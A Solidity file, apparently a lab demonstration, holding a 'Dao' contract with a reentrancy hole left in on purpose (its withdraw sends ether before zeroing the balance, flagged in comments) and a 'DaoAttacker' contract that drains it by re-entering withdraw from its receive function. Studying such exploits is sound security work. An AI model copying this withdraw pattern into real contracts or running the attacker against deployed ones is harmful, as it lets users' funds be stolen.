// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Dao {
    mapping(address => uint256) public balances;

    // Payable constructor
    constructor() payable {
    }

    function getBalance(address account) public view returns (uint256) {
        return balances[account];
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Deposits must be no less than 1 Ether");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");

        // 🔴 Sends ETH before updating balance
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // 🔴 Balance Update after Transfer - Allows Reentrancy!
        balances[msg.sender] = 0;
    }
}

interface IDao {
    function deposit() external payable;
    function withdraw() external;
    function getBalance(address account) external view returns (uint256);
}

contract DaoAttacker {
    IDao dao;
    uint public calls;  // Counter for the number of re-entrancy calls
    uint maxCalls;      // Maximum allowed recursive calls

    constructor(address _dao, uint _maxCalls) payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
        dao = IDao(_dao);
        maxCalls = _maxCalls;
    }

    function attack() public payable {
        calls = 0;
        if (dao.getBalance(address(this)) == 0) {
            dao.deposit{value: 1 ether}();
        }
        dao.withdraw();
    }

    receive() external payable {
        if (calls < maxCalls && address(dao).balance >= 1 ether) {
            calls += 1;
            dao.withdraw();
        }
    }
}

